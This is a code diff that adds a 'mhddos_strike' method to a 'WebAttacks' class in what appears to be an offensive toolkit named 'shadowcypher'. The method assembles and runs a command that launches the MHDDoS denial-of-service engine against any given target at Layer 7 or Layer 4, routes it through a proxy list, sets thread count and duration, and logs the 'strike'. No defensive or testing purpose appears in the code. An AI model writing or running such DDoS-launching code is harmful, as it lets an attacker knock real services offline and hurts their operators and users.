@@ -96,3 +96,20 @@ class WebAttacks:
         return runner.execute_task(
             "NUCLEI_UPDATE", ["nuclei", "-ut"], callback=on_output
         )
+
+    @staticmethod
+    def mhddos_strike(target, method="GET", threads=100, duration=60, on_output=None):
+        """Execute elite Layer 7 or Layer 4 suppression using the MHDDoS engine."""
+        from shadowcypher.core.config import config
+        project_root = str(config.project_root)
+        path = os.path.join(project_root, "tools", "elite", "MHDDoS", "start.py")
+        proxies = os.path.join(project_root, "tools", "elite", "MHDDoS", "files", "proxies", "proxies.txt")
+        
+        if not os.path.exists(path):
+            if on_output: on_output("[ERROR] MHDDoS_ENGINE_NOT_STAGED. Run elite tool acquisition.")
+            return
+
+        # Basic command assembly
+        args = ["python3", path, method, target, "5", str(threads), proxies, "100", str(duration)]
+        logger.info("web", f"MHDDoS STRIKE_DISPATCHED: {target} (Method: {method}, Duration: {duration}s)")
+        return runner.execute_task(f"MHDDOS_{target}", args, callback=on_output)
